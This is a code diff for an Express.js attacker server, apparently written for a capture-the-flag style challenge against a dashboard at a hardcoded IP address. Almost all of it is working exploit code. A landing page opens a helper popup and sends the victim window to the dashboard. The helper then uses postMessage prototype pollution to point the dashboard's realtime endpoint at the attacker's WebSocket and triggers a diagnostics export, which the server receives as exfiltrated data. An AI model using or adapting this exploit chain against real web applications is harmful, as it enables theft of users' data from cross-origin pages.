@@ -7,77 +7,80 @@ expressWs(app);
 const PORT = process.env.PORT || 10000;
 const TARGET = 'http://34.118.127.209:35666/';
 
-const EXPLOIT_HTML = `<!DOCTYPE html>
-<html><head><title>x</title></head>
-<body>
-<script>
-(function(){
-  var T = '__TARGET__';
-  var W = '__WS_URL__';
-
-  function L(m){
-    try{ new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now(); }catch(e){}
-  }
-
-  L('page_loaded');
-
-  var pop = null;
-  try {
-    pop = window.open(T);
-    L('popup=' + (pop ? 'ok' : 'null'));
-  } catch(e){ L('popup_err=' + e.message); }
-
-  function pollute(w) {
-    try {
-      var inner = JSON.parse(
-        '{"__proto__":{"telemetryConsent":true,' +
-        '"channelMode":"ws",' +
-        '"realtimeEndpoint":"' + W + '"}}'
-      );
-      w.postMessage({type:'prefs:update', payload:{theme: inner}}, '*');
-      L('pollute_sent');
-    } catch(e){ L('pollute_err=' + e.message); }
-  }
-
-  function trigger(w) {
-    try {
-      w.postMessage({type:'diagnostics:export'}, '*');
-      L('trigger_sent');
-    } catch(e){ L('trigger_err=' + e.message); }
-  }
-
-  function round() {
-    if (!pop || pop.closed) { L('pop_gone'); return; }
-    try { L('pop.length=' + pop.length); } catch(e){ L('pop.length=err'); }
-    pollute(pop);
-    setTimeout(function(){ trigger(pop); }, 600);
-  }
-
-  var times = [1500, 3000, 5000, 7000, 10000, 14000];
-  times.forEach(function(d){ setTimeout(round, d); });
-})();
-<\/script>
-</body></html>`;
-
-// GET / — serve exploit page
+// ── GET / ── landing: open same-origin helper popup, then navigate self to dashboard
 app.get('/', (req, res) => {
-  const host = req.headers.host || req.hostname;
-  const wsUrl = 'wss://' + host + '/ws';
-  const html = EXPLOIT_HTML
-    .replace(/__TARGET__/g, TARGET)
-    .replace(/__WS_URL__/g, wsUrl);
-  res.type('html').send(html);
+  res.type('html').send(`<!DOCTYPE html>
+<html><body>
+<script>
+// 1. Open helper popup (HTTPS→HTTPS = guaranteed to load)
+var h = window.open(location.origin + '/helper');
+// 2. Navigate THIS window to the dashboard (top-level HTTPS→HTTP = allowed)
+//    After this, helper's window.opener points to the dashboard
+setTimeout(function(){ location.href = '${TARGET}'; }, 500);
+</script>
+</body></html>`);
 });
 
-// GET /log — beacon logger
+// ── GET /helper ── same-origin popup that attacks window.opener (= dashboard)
+app.get('/helper', (req, res) => {
+  const host = req.headers.host || req.hostname;
+  const wsUrl = 'wss://' + host + '/ws';
+  res.type('html').send(`<!DOCTYPE html>
+<html><body>
+<script>
+function L(m){
+  try{new Image().src='/log?'+encodeURIComponent(m)+'&_='+Date.now();}catch(e){}
+}
+L('helper_loaded');
+
+function tryAttack(){
+  if(!window.opener){L('no_opener');return false;}
+
+  // Diagnostic: check if opener navigated cross-origin (= dashboard loaded)
+  var crossOrigin=false;
+  try{var x=window.opener.location.href;L('opener_sameorigin='+x);}
+  catch(e){crossOrigin=true;L('opener_crossorigin');}
+
+  var len=-1;
+  try{len=window.opener.length;}catch(e){L('len_err');}
+  L('opener.len='+len);
+
+  // len=1 means dashboard loaded (it has 1 iframe)
+  // But try even if len=0, in case iframe hasn't loaded yet
+  if(!crossOrigin){return false;} // opener hasn't navigated to dashboard yet
+
+  // Prototype pollution via JSON.parse (__proto__ = own data property)
+  var inner=JSON.parse('{"__proto__":{"telemetryConsent":true,"channelMode":"ws","realtimeEndpoint":"${wsUrl}"}}');
+  window.opener.postMessage({type:'prefs:update',payload:{theme:inner}},'*');
+  L('pollute_ok');
+
+  setTimeout(function(){
+    window.opener.postMessage({type:'diagnostics:export'},'*');
+    L('trigger_ok');
+  },500);
+  return true;
+}
+
+// Poll: wait for dashboard to load, then attack repeatedly
+var attempts=0;
+var iv=setInterval(function(){
+  attempts++;
+  var ok=tryAttack();
+  L('attempt_'+attempts+'_ok='+ok);
+  if(attempts>=25)clearInterval(iv);
+},1500);
+</script>
+</body></html>`);
+});
+
+// ── GET /log ── beacon logger
 app.get('/log', (req, res) => {
-  const qs = req.query;
-  const keys = Object.keys(qs).filter(k => k !== '_');
-  console.log('[beacon]', keys.length ? keys.join('&') : req.originalUrl);
+  var raw = req.originalUrl.replace(/^\/log\?/,'').replace(/&_=\d+$/,'');
+  console.log('[beacon]', decodeURIComponent(raw));
   res.status(204).end();
 });
 
-// WS /ws — receive exfiltrated data
+// ── WS /ws ── receive exfiltrated diagnostics bundle
 app.ws('/ws', (ws, req) => {
   console.log('[ws] connection from', req.ip);
   ws.on('message', (data) => {
